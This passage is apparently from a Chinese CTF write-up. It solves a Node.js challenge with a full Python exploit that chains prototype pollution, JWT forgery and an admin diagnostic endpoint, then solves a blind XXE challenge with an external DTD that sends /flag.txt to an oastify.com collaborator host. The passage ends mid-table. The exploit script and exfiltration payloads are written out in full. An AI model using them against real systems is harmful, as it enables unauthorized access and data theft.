+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// routes/diagnostic.js（关键片段）</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/reports/execute&#x27;</span>, authMiddleware, adminMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> ref = req.<span class="property">body</span>.<span class="property">reference</span>;</span><br><span class="line">  <span class="keyword">if</span> (!ref || <span class="keyword">typeof</span> ref !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Missing report reference&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> entry = config.<span class="property">diagnosticStore</span>[ref];  <span class="comment">// ⚠️ 查找 store 中的 entry</span></span><br><span class="line">  <span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid or expired reference&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TTL 检查</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Date</span>.<span class="title function_">now</span>() - entry.<span class="property">created</span> &gt; entry.<span class="property">ttl</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> config.<span class="property">diagnosticStore</span>[ref];</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">410</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Reference expired&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一次性使用检查</span></span><br><span class="line">  <span class="keyword">if</span> (entry.<span class="property">consumed</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Reference already consumed&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  entry.<span class="property">consumed</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> output = <span class="string">&#x27;Diagnostic failed&#x27;</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    output = <span class="title function_">execSync</span>(<span class="string">&#x27;/readflag&#x27;</span>).<span class="title function_">toString</span>().<span class="title function_">trim</span>(); <span class="comment">// 🚩 直接执行读 flag</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: <span class="string">&#x27;completed&#x27;</span>, <span class="attr">report</span>: output &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：该接口需要 <code>authMiddleware + adminMiddleware</code> 双重鉴权，且需要一个有效的 <code>reference</code>。注意 <code>config.diagnosticStore</code> 是通过 <code>Object.create(null)</code> 创建的（经实测原型链污染对其无效），因此<strong>不能通过污染注入 entry，必须找到合法创建途径</strong>。</p>
+<h3 id="4-admin-面板-合法创建-diagnostic-entry-routesadminjs"><a class="markdownIt-Anchor" href="#4-admin-面板-合法创建-diagnostic-entry-routesadminjs"></a> 4. Admin 面板 — 合法创建 Diagnostic Entry (<code>routes/admin.js</code>)</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// routes/admin.js（完整源码）</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; authMiddleware, adminMiddleware &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../middleware/auth&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;../config&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>, authMiddleware, adminMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> tokenId = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>); <span class="comment">// 生成 32 位 hex</span></span><br><span class="line">  <span class="keyword">var</span> entry = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">  entry.<span class="property">owner</span> = req.<span class="property">user</span>.<span class="property">username</span>;</span><br><span class="line">  entry.<span class="property">created</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">  entry.<span class="property">ttl</span> = <span class="number">120000</span>;       <span class="comment">// 120 秒有效期</span></span><br><span class="line">  entry.<span class="property">consumed</span> = <span class="literal">false</span>;</span><br><span class="line">  config.<span class="property">diagnosticStore</span>[tokenId] = entry;  <span class="comment">// ✅ 合法写入 store</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> stats = &#123;</span><br><span class="line">    <span class="attr">users</span>: <span class="string">&#x27;N/A&#x27;</span>,</span><br><span class="line">    <span class="attr">uptime</span>: process.<span class="title function_">uptime</span>().<span class="title function_">toFixed</span>(<span class="number">0</span>) + <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    <span class="attr">memory</span>: (process.<span class="title function_">memoryUsage</span>().<span class="property">heapUsed</span> / <span class="number">1024</span> / <span class="number">1024</span>).<span class="title function_">toFixed</span>(<span class="number">1</span>) + <span class="string">&#x27; MB&#x27;</span>,</span><br><span class="line">    <span class="attr">signingVersion</span>: config.<span class="property">signingState</span>.<span class="property">version</span>,</span><br><span class="line">    <span class="attr">reference</span>: tokenId      <span class="comment">// ⚠️ reference 暴露在渲染模板中</span></span><br><span class="line">  &#125;;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">user</span>: req.<span class="property">user</span>, <span class="attr">stats</span>: stats &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/api/admin/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Admin login endpoint is disabled.&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/admin/promote&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Promotion endpoint requires internal network access.&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：这是<strong>唯一合法创建 diagnostic entry 的端点</strong>。访问 <code>GET /admin</code> 时，服务端自动生成 <code>tokenId</code> 并写入 <code>diagnosticStore</code>，同时在渲染的 HTML 页面中通过 <code>stats.reference</code> 泄露该值。我们只需用伪造的 Admin JWT 访问此页面，提取 reference，即可在 120 秒内用于 <code>/api/reports/execute</code>。</p>
+<hr />
+<h2 id="完整-exp"><a class="markdownIt-Anchor" href="#完整-exp"></a> 完整 Exp</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt, json, ssl, socket, re, time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;3f5e444e.tcp-ctf2.dasctf.com&quot;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">EVIL_KEY = <span class="string">&quot;dasctf_evil_signing_key_2026_xxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line">ctx = ssl.create_default_context()</span><br><span class="line">ctx.check_hostname = <span class="literal">False</span></span><br><span class="line">ctx.verify_mode = ssl.CERT_NONE</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_raw</span>(<span class="params">method, path, body=<span class="literal">None</span>, cookies=<span class="literal">None</span></span>):</span><br><span class="line">    sock = socket.create_connection((HOST, PORT))</span><br><span class="line">    ssock = ctx.wrap_socket(sock, server_hostname=HOST)</span><br><span class="line">    h = <span class="string">f&quot;<span class="subst">&#123;method&#125;</span> <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\nHost: <span class="subst">&#123;HOST&#125;</span>\r\nConnection: close\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> cookies:</span><br><span class="line">        cookie_str = <span class="string">&quot;; &quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;v&#125;</span>&quot;</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> cookies.items())</span><br><span class="line">        h += <span class="string">f&quot;Cookie: <span class="subst">&#123;cookie_str&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        d = json.dumps(body).encode()</span><br><span class="line">        h += <span class="string">f&quot;Content-Type: application/json\r\nContent-Length: <span class="subst">&#123;<span class="built_in">len</span>(d)&#125;</span>\r\n\r\n&quot;</span></span><br><span class="line">        ssock.sendall(h.encode() + d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ssock.sendall((h + <span class="string">&quot;\r\n&quot;</span>).encode())</span><br><span class="line">    r = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = ssock.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c: <span class="keyword">break</span></span><br><span class="line">        r += c</span><br><span class="line">    ssock.close()</span><br><span class="line">    <span class="keyword">return</span> r.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_all_cookies</span>(<span class="params">resp</span>):</span><br><span class="line">    cookies = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[Ss]et-[Cc]ookie:\s*([^=]+)=([^;]+)&#x27;</span>, resp):</span><br><span class="line">        cookies[<span class="keyword">match</span>.group(<span class="number">1</span>)] = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Step 1: 注册并登录普通用户 ==========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Step 1: Register &amp; Login...&quot;</span>)</span><br><span class="line">send_raw(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/register&quot;</span>, &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;exploit5&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test1234&quot;</span>,</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="string">&quot;e5@e.com&quot;</span>, <span class="string">&quot;department&quot;</span>: <span class="string">&quot;IT&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">login_resp = send_raw(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/login&quot;</span>, &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;exploit5&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test1234&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">cookies = extract_all_cookies(login_resp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Got token: <span class="subst">&#123;<span class="string">&#x27;token&#x27;</span> <span class="keyword">in</span> cookies&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Step 2: 原型链污染 → 触发密钥轮换 ==========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Step 2: Prototype pollution → Key rotation...&quot;</span>)</span><br><span class="line">rotation_payload = &#123;</span><br><span class="line">    <span class="string">&quot;notifications&quot;</span>: &#123;<span class="string">&quot;digest&quot;</span>: &#123;<span class="string">&quot;channels&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;prototype&quot;</span>: &#123;<span class="string">&quot;pending&quot;</span>: EVIL_KEY&#125;&#125;</span><br><span class="line">    &#125;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">send_raw(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/api/settings&quot;</span>, rotation_payload, cookies)</span><br><span class="line">hc = send_raw(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/api/system/healthcheck&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&quot;rotated&quot;:true&#x27;</span> <span class="keyword">in</span> hc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[✅] Key rotation triggered! jwtSecret =&quot;</span>, EVIL_KEY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[❌] Rotation failed, aborting.&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Step 3: 使用已知密钥伪造 Admin JWT ==========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Step 3: Forging admin JWT...&quot;</span>)</span><br><span class="line">admin_token = jwt.encode(</span><br><span class="line">    &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;exploit5&quot;</span>, <span class="string">&quot;username&quot;</span>: <span class="string">&quot;exploit5&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;,</span><br><span class="line">    EVIL_KEY, algorithm=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">)</span><br><span class="line">admin_cookies = &#123;<span class="string">&quot;token&quot;</span>: admin_token&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Admin JWT forged with role=admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Step 4: 访问 /admin 获取合法 diagnostic reference ==========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Step 4: Visiting /admin to obtain diagnostic reference...&quot;</span>)</span><br><span class="line">admin_page = send_raw(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/admin&quot;</span>, cookies=admin_cookies)</span><br><span class="line">status_line = admin_page.split(<span class="string">&quot;\r\n&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] /admin response: <span class="subst">&#123;status_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ref_match = re.search(<span class="string">r&#x27;reference[&quot;\s:=]+([a-f0-9]&#123;32&#125;)&#x27;</span>, admin_page, re.IGNORECASE)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ref_match:</span><br><span class="line">    ref_match = re.search(<span class="string">r&#x27;([a-f0-9]&#123;32&#125;)&#x27;</span>, admin_page)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ref_match:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[❌] Could not extract reference from admin page&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">reference = ref_match.group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[✅] Got reference: <span class="subst">&#123;reference&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Step 5: 使用合法 reference 执行报告读取 Flag ==========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Step 5: Executing report to read flag...&quot;</span>)</span><br><span class="line">r = send_raw(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/api/reports/execute&quot;</span>,</span><br><span class="line">             &#123;<span class="string">&quot;reference&quot;</span>: reference&#125;, admin_cookies)</span><br><span class="line">resp_body = r.split(<span class="string">&quot;\r\n\r\n&quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>] <span class="keyword">if</span> <span class="string">&quot;\r\n\r\n&quot;</span> <span class="keyword">in</span> r <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Response: <span class="subst">&#123;r.split(<span class="built_in">chr</span>(<span class="number">13</span>))[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Body: <span class="subst">&#123;resp_body&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag_match = re.search(<span class="string">r&#x27;(DASCTF\&#123;[^&#125;]+\&#125;|flag\&#123;[^&#125;]+\&#125;)&#x27;</span>, resp_body, re.IGNORECASE)</span><br><span class="line"><span class="keyword">if</span> flag_match:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🚩 FLAG: <span class="subst">&#123;flag_match.group(<span class="number">1</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;completed&#x27;</span> <span class="keyword">in</span> resp_body:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🚩 REPORT COMPLETED — Flag in output above!&quot;</span>)</span><br></pre></td></tr></table></figure>
+<hr />
+<h2 id="攻击链总结"><a class="markdownIt-Anchor" href="#攻击链总结"></a> 攻击链总结</h2>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>接口</th>
+<th>漏洞/机制</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>①</td>
+<td><code>POST /api/settings</code></td>
+<td><code>sanitizeKey</code><br/> 未过滤 <code>constructor.prototype</code></td>
+<td>污染 <code>Object.prototype.pending</code></td>
+</tr>
+<tr>
+<td>②</td>
+<td><code>GET /api/system/healthcheck</code></td>
+<td><code>&#123;&#125;.pending</code><br/> 读取被污染的原型属性</td>
+<td>将 <code>jwtSecret</code><br/> 替换为攻击者控制的密钥</td>
+</tr>
+<tr>
+<td>③</td>
+<td>本地</td>
+<td>PyJWT + 已知密钥</td>
+<td>伪造 <code>role:admin</code><br/> 的 JWT Token</td>
+</tr>
+<tr>
+<td>④</td>
+<td><code>GET /admin</code></td>
+<td>合法创建 <code>diagnosticStore</code><br/> entry 并在 HTML 中泄露 reference</td>
+<td>获取一次性有效引用</td>
+</tr>
+<tr>
+<td>⑤</td>
+<td><code>POST /api/reports/execute</code></td>
+<td>持有效 reference + Admin 权限</td>
+<td>触发 <code>execSync('/readflag')</code><br/> 拿到 Flag</td>
+</tr>
+</tbody>
+</table>
+<h3 id="踩坑记录"><a class="markdownIt-Anchor" href="#踩坑记录"></a> 踩坑记录</h3>
+<ul>
+<li><strong>原型链污染对 <strong><code>**Object.create(null)**</code></strong> 无效</strong>：<code>config.diagnosticStore</code> 使用 <code>Object.create(null)</code> 创建，没有原型链，因此无法通过污染直接注入 entry。这是本题最大的陷阱，必须通过代码审计找到 <code>/admin</code> 这个合法写入端点。</li>
+<li><code>**sanitizeKey**</code>** 的绕过**：仅移除 <code>.</code> 而不过滤 <code>constructor</code> / <code>prototype</code> / <code>__proto__</code> 是典型的原型链污染绕过场景。</li>
+<li><strong>Reference 的一次性与时效性</strong>：entry 有 120 秒 TTL 且只能使用一次，提取后必须立即调用 execute 接口。</li>
+</ul>
+<h1 id="taxmanager"><a class="markdownIt-Anchor" href="#taxmanager"></a> TaxManager</h1>
+<p>本题考察 XML 外部实体注入（XXE）漏洞的利用。由于目标环境存在 WAF 且无回显（Blind XXE），无法直接在页面中读取文件内容。需要通过加载外部恶意 DTD 文件，结合 OASTify 等带外测试平台，将敏感文件（<code>flag.txt</code>）的内容通过 HTTP/DNS 请求外带到攻击者服务器上。</p>
+<h2 id="解题思路"><a class="markdownIt-Anchor" href="#解题思路"></a> 解题思路</h2>
+<ol>
+<li><strong>绕过 WAF</strong>：直接将恶意实体定义写在本地 XML 中容易被拦截，因此采用“外部 DTD 引用”的方式，将核心 Payload 托管在 GitHub Gist Raw 链接上，实现 Payload 与触发代码分离。</li>
+<li><strong>解决换行符报错</strong>：初次尝试将 flag 拼接到子域名进行 DNS 外带时，遇到 <code>Illegal character found in host: LF</code> 错误。原因是 Linux 下文本文件末尾自带换行符（<code>\n</code>），导致域名解析失败。</li>
+<li><strong>优化外带方式</strong>：将外带方式从“DNS 子域名拼接”改为“HTTP URL 参数传递”，使换行符被自动编码为 <code>%0A</code>，从而避免主机名非法字符问题，成功实现数据外带。</li>
+</ol>
+<h2 id="利用过程"><a class="markdownIt-Anchor" href="#利用过程"></a> 利用过程</h2>
+<h3 id="step-1-准备外部恶意-dtd"><a class="markdownIt-Anchor" href="#step-1-准备外部恶意-dtd"></a> Step 1: 准备外部恶意 DTD</h3>
+<p>在 GitHub Gist 创建 <code>evil.dtd</code>，初始版本尝试通过 DNS 子域名外带：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#37; exfil SYSTEM &#x27;http://%file;.gdx5ijhmn0d6ozmpd4yfnfqp7gd71xpm.oastify.com/&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+<p>⚠️ <strong>踩坑记录</strong>：提交后靶场返回 <code>Error parsing XML: Illegal character found in host: LF</code>。因为 <code>flag.txt</code> 内容包含换行符，拼接到域名位置时破坏了 URL 结构。</p>
+<h3 id="step-2-修复-payload-并更新-gist"><a class="markdownIt-Anchor" href="#step-2-修复-payload-并更新-gist"></a> Step 2: 修复 Payload 并更新 Gist</h3>
+<p>将外带位置从<strong>子域名</strong>调整为 <strong>URL 查询参数</strong>，修改 <code>evil.dtd</code> 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#37; exfil SYSTEM &#x27;http://gdx5ijhmn0d6ozmpd4yfnfqp7gd71xpm.oastify.com/?f=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+<p><strong>原理</strong>：作为 URL 参数时，换行符会被 HTTP 客户端自动编码为 <code>%0A</code>，不再影响主机名解析，同时 Burp Collaborator 仍能完整捕获请求内容。</p>
+<h3 id="step-3-构造纯净-xml-触发漏洞"><a class="markdownIt-Anchor" href="#step-3-构造纯净-xml-触发漏洞"></a> Step 3: 构造纯净 XML 触发漏洞</h3>
+<p>使用 GitHub Raw 链接引用更新后的 DTD，向靶场提交以下 XML：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://gist.githubusercontent.com/EtherLin0606/1bfbe7106ff3283ba5d50789a0ebd077/raw/d921e873ae93d1c23ab7436863ac48c0eb71167e/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span>test<span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="step-4-获取-flag"><a class="markdownIt-Anchor" href="#step-4-获取-flag"></a> Step 4: 获取 Flag</h3>
+<p>提交后立即在 Burp Suite Collaborator 中点击 <strong>Poll now</strong>，成功捕获一条 HTTP 请求，Flag 出现在 <code>?f=</code> 参数中（去除末尾的 <code>%0A</code> 即为最终答案）。</p>
+<img src="https://cdn.nlark.com/yuque/0/2026/png/62807544/1780122112328-38534f08-d84e-4bc7-a1c0-be7bdb6034e6.png" width="1372" title="" crop="0,0,1,1" id="u931931b3" class="ne-image">
+<h2 id="知识点总结"><a class="markdownIt-Anchor" href="#知识点总结"></a> 知识点总结</h2>
+<table>
+<thead>
+<tr>
+<th>技术点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Blind XXE</strong></td>
+<td>无回显场景下，必须依赖 OOB 通道外带数据</td>
+</tr>
+<tr>
